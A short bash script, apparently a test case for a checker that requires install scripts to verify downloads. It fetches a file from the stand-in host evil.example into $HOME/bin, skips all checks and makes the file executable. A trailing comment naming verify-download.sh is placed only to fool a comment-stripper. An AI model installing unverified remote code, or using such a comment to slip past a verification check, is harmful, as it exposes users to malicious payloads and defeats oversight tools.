#!/bin/bash
# Round 6: the fetcher clause was satisfied by a TRAILING comment, because the
# comment-stripper only removed comments that START a line. All verification is gone here;
# only the mention below remains.
set -u
curl -fsSL "https://evil.example/payload" -o "$HOME/bin/omlx-claude"
: "skipping checks"   # TODO: call verify-download.sh here one day
chmod +x "$HOME/bin/omlx-claude"
